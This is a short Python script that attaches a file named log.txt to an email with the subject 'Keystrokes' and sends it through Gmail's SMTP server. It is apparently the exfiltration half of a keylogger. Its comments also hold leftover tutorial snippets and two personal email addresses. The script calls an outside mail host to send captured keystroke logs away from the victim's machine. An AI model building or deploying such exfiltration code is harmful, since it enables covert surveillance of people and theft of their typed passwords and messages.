import os 
import smtplib
import imghdr
from email.message import EmailMessage

EMAIL_ADDRESS = os.environ.get('EMAIL_ADDRESS')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD')

#contacts  = ['isatrevor052@gmail.com' , 'trevor.nyagaka@strathmore.edu']
msg = EmailMessage()
msg['Subject'] = 'Keystrokes'
msg['From'] = EMAIL_ADDRESS
msg['To'] = EMAIL_ADDRESS #contacts
msg.set_content('An file has been attached...')


files = ['log.txt']


for file in files:
	with open(file , 'rb') as f:
		file_data = f.read()
		#file_type = imghdr.what(f.name)
		file_name = f.name

	msg .add_attachment(file_data, maintype = 'application', subtype ='octet-stream', filename= file_name)
	#msg.add_attachment(file_data. maintype= 'image' , subtype = '',filename=file_name)
#generic bag of bits

with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
#with smtplib.SMTP('localhost', 1025) as smtp:
#	smtp.ehlo() #identifies ourselves with the mail server
#	smtp.starttls() #encryption
#	smtp.ehlo() #reidentify ourselves

	smtp.login(EMAIL_ADDRESS,EMAIL_PASSWORD)


	#subject = 'dinnerrr today?'
	#body = 'How about dinner tonight?'

	#msg= f'Subject: {subject}\n\n{body}'

	smtp.send_message(msg)


#to run this code on a local debug server, comment out line 8, 10, 11, 12, 14
#then run this code on terminal if on windows : py -m smtpd -c DebuggingServer -n localhost:1025

